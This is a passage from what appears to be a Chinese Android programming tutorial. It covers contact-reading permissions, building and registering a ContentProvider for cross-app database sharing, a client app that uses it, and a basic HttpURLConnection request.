class="number">0</span>] == PackageManager.</span><br><span class="line">                    PERMISSION_GRANTED) &#123;</span><br><span class="line">                    readContacts();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;You denied the permission&quot;</span>, Toast.LENGTH_</span><br><span class="line">                        SHORT).show();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时还需在<code>AndroidManifest.xml</code>中添加权限</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CONTACTS&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="创建自己的内容提供器">创建自己的内容提供器<a class="header-anchor" href="#创建自己的内容提供器"> ¶ </a></h3>
<h4 id="创建内容提供器的步骤">创建内容提供器的步骤<a class="header-anchor" href="#创建内容提供器的步骤"> ¶ </a></h4>
<ol>
<li>
<p>新建一个类去继承<code>ContentProvider</code> 的方式来创建一个自己的内容提供器。该类有6个抽象方法</p>
<ol>
<li>
<p>onCreate()：初始化内容提供器的时候调用。。通常会在这里完成对数据库的创建和升级等操作，返回true 表示内容提供器初始化成功，返回false则表示失败。</p>
</li>
<li>
<p>query()：从内容提供器中查询数据。使用uri 参数来确定查询哪张表，projection 参数用于确定查询哪些列，selection 和selectionArgs 参数用于约束查询哪些行，sortOrder 参数用于对结果进行排序，查询的结果存放在Cursor对象中返回。</p>
</li>
<li>
<p>insert()：向内容提供器中添加一条数据。使用uri 参数来确定要添加到的表，待添加的数据保存在values 参数中。添加完成后，返回一个用于表示这条新记录的URI。</p>
</li>
<li>
<p>update()：更新内容提供器中已有的数据。使用uri 参数来确定更新哪一张表中的数据，新数据保存在values 参数中，selection 和selectionArgs 参数用于约束更新哪些行，受影响的行数将作为返回值返回。</p>
</li>
<li>
<p>delete()：从内容提供器中删除数据。使用uri 参数来确定删除哪一张表中的数可以看到，几乎每一个方法都会带有Uri 这个参数，这个参数也正是调用ContentResolver的增删改查方法时传递过来的。而现在，我们需要对传入的Uri 参数进行解析，从中分析出调用方期望访问的表和数据。</p>
</li>
<li>
<p>getType()：根据传入的内容URI来返回相应的MIME类型。</p>
<p>一个内容URI所对应的MIME字符串主要由3部分组成</p>
<ul>
<li>必须以vnd 开头。</li>
<li>如果内容URI以路径结尾，则后接<code>android.cursor.dir/</code> ；如果内容URI以<code>id</code>结尾，则后接<code>android.cursor.item/</code> 。</li>
<li>最后接上<code>vnd.&lt;authority&gt;.&lt;path&gt;</code> 。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProvider</span> <span class="keyword">extends</span> <span class="title">ContentProvider</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getType</span><span class="params">(Uri uri)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (uriMatcher.match(uri)) &#123;</span><br><span class="line">        <span class="keyword">case</span> TABLE1_DIR:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;vnd.android.cursor.dir/vnd.com.example.app.provider.table1&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> TABLE1_ITEM:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;vnd.android.cursor.item/vnd.com.example.app.provider.table1&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> TABLE2_DIR:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;vnd.android.cursor.dir/vnd.com.example.app.provider.table2&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> TABLE2_ITEM:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;vnd.android.cursor.item/vnd.com.example.app.provider.table2&quot;</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li>
<p><code>URI</code>参数</p>
<ul>
<li>
<p>标准URI写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">content:<span class="comment">//[Package Name]/[Table Name]/[ID]</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>通配符</p>
<ul>
<li><code>*</code>：表示匹配任意长度的任意字符
<ul>
<li>如匹配任意表：<code>content://[Package Name]/*</code></li>
</ul>
</li>
<li><code>#</code>：表示匹配任意长度的数字
<ul>
<li>如匹配table表任意一行内容：<code>content://[Package Name]/table/#</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>UriMatcher</code>类：</p>
<p>可以轻松地实现匹配内容URI的功能</p>
<ul>
<li>addURI() 方法： 接收3个参数，分别为<code>authority</code> 、<code>path</code> 和一个自定义代码传进去</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProvider</span> <span class="keyword">extends</span> <span class="title">ContentProvider</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TABLE1_DIR = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TABLE1_ITEM = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TABLE2_DIR = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TABLE2_ITEM = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> UriMatcher uriMatcher;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        uriMatcher = <span class="keyword">new</span> UriMatcher(UriMatcher.NO_MATCH);</span><br><span class="line">        uriMatcher.addURI(<span class="string">&quot;com.example.app.provider&quot;</span>, <span class="string">&quot;table1&quot;</span>, TABLE1_DIR);</span><br><span class="line">        uriMatcher.addURI(<span class="string">&quot;com.example.app.provider &quot;</span>, <span class="string">&quot;table1/#&quot;</span>, TABLE1_ITEM);</span><br><span class="line">        uriMatcher.addURI(<span class="string">&quot;com.example.app.provider &quot;</span>, <span class="string">&quot;table2&quot;</span>, TABLE2_DIR);</span><br><span class="line">        uriMatcher.addURI(<span class="string">&quot;com.example.app.provider &quot;</span>, <span class="string">&quot;table2/#&quot;</span>, TABLE2_ITEM);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cursor <span class="title">query</span><span class="params">(Uri uri, String[] projection, String selection, String[]</span></span></span><br><span class="line"><span class="params"><span class="function">        selectionArgs, String sortOrder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (uriMatcher.match(uri)) &#123;</span><br><span class="line">        <span class="keyword">case</span> TABLE1_DIR:</span><br><span class="line">            <span class="comment">// 查询table1表中的所有数据</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TABLE1_ITEM:</span><br><span class="line">            <span class="comment">// 查询table1表中的单条数据</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TABLE2_DIR:</span><br><span class="line">            <span class="comment">// 查询table2表中的所有数据</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TABLE2_ITEM:</span><br><span class="line">            <span class="comment">// 查询table2表中的单条数据</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="实现跨程序数据共享">实现跨程序数据共享<a class="header-anchor" href="#实现跨程序数据共享"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DatabaseProvider</span> <span class="keyword">extends</span> <span class="title">ContentProvider</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BOOK_DIR = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BOOK_ITEM = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CATEGORY_DIR = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CATEGORY_ITEM = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String AUTHORITY = <span class="string">&quot;com.example.databasetest.provider&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> UriMatcher uriMatcher;</span><br><span class="line">    <span class="keyword">private</span> MyDatabaseHelper dbHelper;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        uriMatcher = <span class="keyword">new</span> UriMatcher(UriMatcher.NO_MATCH);</span><br><span class="line">        uriMatcher.addURI(AUTHORITY, <span class="string">&quot;book&quot;</span>, BOOK_DIR);</span><br><span class="line">        uriMatcher.addURI(AUTHORITY, <span class="string">&quot;book/#&quot;</span>, BOOK_ITEM);</span><br><span class="line">        uriMatcher.addURI(AUTHORITY, <span class="string">&quot;category&quot;</span>, CATEGORY_DIR);</span><br><span class="line">        uriMatcher.addURI(AUTHORITY, <span class="string">&quot;category/#&quot;</span>, CATEGORY_ITEM);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        dbHelper = <span class="keyword">new</span> MyDatabaseHelper(getContext(), <span class="string">&quot;BookStore.db&quot;</span>, <span class="keyword">null</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cursor <span class="title">query</span><span class="params">(Uri uri, String[] projection, String selection, String[]</span></span></span><br><span class="line"><span class="params"><span class="function">        selectionArgs, String sortOrder)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 查询数据</span></span><br><span class="line"></span><br><span class="line">        SQLiteDatabase db = dbHelper.getReadableDatabase();</span><br><span class="line">        Cursor cursor = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">switch</span> (uriMatcher.match(uri)) &#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">                cursor = db.query(<span class="string">&quot;Book&quot;</span>, projection, selection, selectionArgs, <span class="keyword">null</span>,</span><br><span class="line">                    <span class="keyword">null</span>, sortOrder);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                String bookId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                cursor = db.query(<span class="string">&quot;Book&quot;</span>, projection, <span class="string">&quot;id = ?&quot;</span>, <span class="keyword">new</span> String[] &#123; bookId &#125;,</span><br><span class="line">                    <span class="keyword">null</span>, <span class="keyword">null</span>, sortOrder);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIR:</span><br><span class="line">                cursor = db.query(<span class="string">&quot;Category&quot;</span>, projection, selection, selectionArgs,</span><br><span class="line">                    <span class="keyword">null</span>, <span class="keyword">null</span>, sortOrder);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_ITEM:</span><br><span class="line">                String categoryId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                cursor = db.query(<span class="string">&quot;Category&quot;</span>, projection, <span class="string">&quot;id = ?&quot;</span>, <span class="keyword">new</span> String[]</span><br><span class="line">                    &#123; categoryId &#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, sortOrder);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cursor;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Uri <span class="title">insert</span><span class="params">(Uri uri, ContentValues values)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 添加数据</span></span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        Uri uriReturn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">switch</span> (uriMatcher.match(uri)) &#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                <span class="keyword">long</span> newBookId = db.insert(<span class="string">&quot;Book&quot;</span>, <span class="keyword">null</span>, values);</span><br><span class="line">                uriReturn = Uri.parse(<span class="string">&quot;content://&quot;</span> + AUTHORITY + <span class="string">&quot;/book/&quot;</span> +</span><br><span class="line">                   newBookId);</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * Uri uri = Uri.parse(&quot;content://org.providers.prods/word&quot;);</span></span><br><span class="line"><span class="comment">                 * Uri resultUri = ContentUris.withAppendedId(uri,5);</span></span><br><span class="line"><span class="comment">                 * // 返回resultUri为：content://org.providers.prods/word/5</span></span><br><span class="line"><span class="comment">                 * Long id = ContentUris.parseId(resultUri); </span></span><br><span class="line"><span class="comment">                 * // 返回5</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIR:</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_ITEM:</span><br><span class="line">                <span class="keyword">long</span> newCategoryId = db.insert(<span class="string">&quot;Category&quot;</span>, <span class="keyword">null</span>, values);</span><br><span class="line">                uriReturn = Uri.parse(<span class="string">&quot;content://&quot;</span> + AUTHORITY + <span class="string">&quot;/category/&quot;</span> +</span><br><span class="line">                    newCategoryId);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> uriReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">update</span><span class="params">(Uri uri, ContentValues values, String selection, String[]</span></span></span><br><span class="line"><span class="params"><span class="function">        selectionArgs)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 更新数据</span></span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        <span class="keyword">int</span> updatedRows = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span> (uriMatcher.match(uri)) &#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">                updatedRows = db.update(<span class="string">&quot;Book&quot;</span>, values, selection, selectionArgs);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                String bookId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                updatedRows = db.update(<span class="string">&quot;Book&quot;</span>, values, <span class="string">&quot;id = ?&quot;</span>, <span class="keyword">new</span> String[]</span><br><span class="line">                    &#123; bookId &#125;);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIR:</span><br><span class="line">                updatedRows = db.update(<span class="string">&quot;Category&quot;</span>, values, selection,</span><br><span class="line">                    selectionArgs);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_ITEM:</span><br><span class="line">                String categoryId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                updatedRows = db.update(<span class="string">&quot;Category&quot;</span>, values, <span class="string">&quot;id = ?&quot;</span>, <span class="keyword">new</span> String[]</span><br><span class="line">                    &#123; categoryId &#125;);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> updatedRows;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 删除数据</span></span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        <span class="keyword">int</span> deletedRows = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span> (uriMatcher.match(uri)) &#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">                deletedRows = db.delete(<span class="string">&quot;Book&quot;</span>, selection, selectionArgs);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                String bookId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                deletedRows = db.delete(<span class="string">&quot;Book&quot;</span>, <span class="string">&quot;id = ?&quot;</span>, <span class="keyword">new</span> String[] &#123; bookId &#125;);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIR:</span><br><span class="line">                deletedRows = db.delete(<span class="string">&quot;Category&quot;</span>, selection, selectionArgs);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_ITEM:</span><br><span class="line">                String categoryId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                deletedRows = db.delete(<span class="string">&quot;Category&quot;</span>, <span class="string">&quot;id = ?&quot;</span>, <span class="keyword">new</span> String[]</span><br><span class="line">                    &#123; categoryId &#125;);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deletedRows;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getType</span><span class="params">(Uri uri)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (uriMatcher.match(uri)) &#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;vnd.android.cursor.dir/vnd.com.example.databasetest.provider.book&quot;</span>;</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;vnd.android.cursor.item/vnd.com.example.databasetest.provider.book&quot;</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIR:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;vnd.android.cursor.dir/vnd.com.example.databasetest.provider.category&quot;</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_ITEM:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;vnd.android.cursor.item/vnd.com.example.databasetest.provider.category&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中还需要在<code>AndroidManifest.xml</code>中注册<code>provider</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.DatabaseProvider&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:authorities</span>=<span class="string">&quot;com.example.databasetest.provider&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>android:name</code> 属性指定了<code>DatabaseProvider</code>的类名</li>
<li><code>android:authorities</code> 属性指定了<code>DatabaseProvider</code>的<code>authority</code></li>
<li><code>enabled</code> 和<code>exported</code> 属性则是根据我们刚才勾选的状态自动生成的，这里表示允许<code>DatabaseProvider</code>被其他应用程序进行访问；Enabled 属性表示是否启用</li>
</ul>
<p>另写一程序来调用该数据库</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String newId;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button addData = (Button) findViewById(R.id.add_data);</span><br><span class="line">        addData.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 添加数据</span></span><br><span class="line">                Uri uri = Uri.parse(<span class="string">&quot;content://com.example.databasetest.provider/book&quot;</span>);</span><br><span class="line">                ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">                values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;A Clash of Kings&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;George Martin&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;pages&quot;</span>, <span class="number">1040</span>);</span><br><span class="line">                values.put(<span class="string">&quot;price&quot;</span>, <span class="number">22.85</span>);</span><br><span class="line">                Uri newUri = getContentResolver().insert(uri, values);</span><br><span class="line"></span><br><span class="line">                newId = newUri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Button queryData = (Button) findViewById(R.id.query_data);</span><br><span class="line">        queryData.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 查询数据</span></span><br><span class="line">                Uri uri = Uri.parse(<span class="string">&quot;content://com.example.databasetest. provider/book&quot;</span>);</span><br><span class="line">                Cursor cursor = getContentResolver().query(uri, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>,</span><br><span class="line">                    <span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">if</span> (cursor != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (cursor.moveToNext()) &#123;</span><br><span class="line">                        String name = cursor.getString(cursor. getColumnIndex</span><br><span class="line">                            (<span class="string">&quot;name&quot;</span>));</span><br><span class="line">                        String author = cursor.getString(cursor. getColumnIndex</span><br><span class="line">                            (<span class="string">&quot;author&quot;</span>));</span><br><span class="line">                        <span class="keyword">int</span> pages = cursor.getInt(cursor.getColumnIndex (<span class="string">&quot;pages&quot;</span>));</span><br><span class="line">                        <span class="keyword">double</span> price = cursor.getDouble(cursor. getColumnIndex</span><br><span class="line">                            (<span class="string">&quot;price&quot;</span>));</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book name is &quot;</span> + name);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book author is &quot;</span> + author);</span><br><span class="line"></span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book pages is &quot;</span> + pages);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book price is &quot;</span> + price);</span><br><span class="line">                    &#125;</span><br><span class="line">                    cursor.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Button updateData = (Button) findViewById(R.id.update_data);</span><br><span class="line">        updateData.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 更新数据</span></span><br><span class="line">                Uri uri = Uri.parse(<span class="string">&quot;content://com.example.databasetest. provider/book/&quot;</span> + newId);</span><br><span class="line">                ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">                values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;A Storm of Swords&quot;</span>);</span><br><span class="line">                values.put(<span class="string">&quot;pages&quot;</span>, <span class="number">1216</span>);</span><br><span class="line">                values.put(<span class="string">&quot;price&quot;</span>, <span class="number">24.05</span>);</span><br><span class="line">                getContentResolver().update(uri, values, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Button deleteData = (Button) findViewById(R.id.delete_data);</span><br><span class="line">        deleteData.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 删除数据</span></span><br><span class="line">                Uri uri = Uri.parse(<span class="string">&quot;content://com.example.databasetest. provider/book/&quot;</span> + newId);</span><br><span class="line">                getContentResolver().delete(uri, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="使用网络技术">使用网络技术<a class="header-anchor" href="#使用网络技术"> ¶ </a></h2>
<h3 id="使用Http访问网络">使用Http访问网络<a class="header-anchor" href="#使用Http访问网络"> ¶ </a></h3>
<h4 id="使用HttpURLConnection">使用HttpURLConnection<a class="header-anchor" href="#使用HttpURLConnection"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// new一个Url对象</span></span><br><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line"><span class="comment">// new HttpURLConnection 新建连接</span></span><br><span class="line">HttpURLConnection connection = (HttpURLConnection) url.openConnection();</span><br><span class="line"><span class="comment">// 可设置请求方式 GET/POST</span></span><br><span class="line">connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line"><span class="comment">// 设置连接超时毫秒数</span></span><br><span class="line">connection.setConnectTimeout(<span class="number">8000</span>);</span><br><span class="line"><span class="comment">// 设置读取超时毫秒数</span></span><br><span class="line">connection.setReadTimeout(<span class="number">8000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果为POST，获取输出流</span></span><br><span class="line">OutputStream os = connection.getOutputStream();</span><br><span class="line"><span class="comment">// 传入post参数</span></span><br><span class="line">os.write(<span class="string">&quot;username=张三&amp;age=20&quot;</span>.getBytes());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得输入流</span></span><br><span class="line">InputStream in = connection.getInputStream();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行字节流读取相关操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭流</span></span><br><span class="line">in.close();</span><br><span class="line">os.close();</span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line">connection.disconnect();</span><br></pre></td></tr></table></figure>
<h4 id="使用OkHttp">使用OkHttp<a class="header-anchor" href="#使用OkHttp"> ¶ </a></h4>
